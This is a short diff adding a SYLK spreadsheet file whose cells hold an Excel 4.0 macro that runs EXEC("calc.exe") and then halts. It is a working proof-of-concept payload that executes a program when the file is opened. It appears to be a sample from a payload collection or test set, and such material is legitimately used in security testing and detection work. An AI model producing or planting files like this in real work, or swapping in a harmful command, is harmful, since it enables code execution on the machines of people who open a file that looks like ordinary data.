@@ -1,0 +1,4 @@
+ID;PWXL;N;E
+C;X1;Y1;EEXEC("calc.exe")
+C;X1;Y2;EHALT()
+
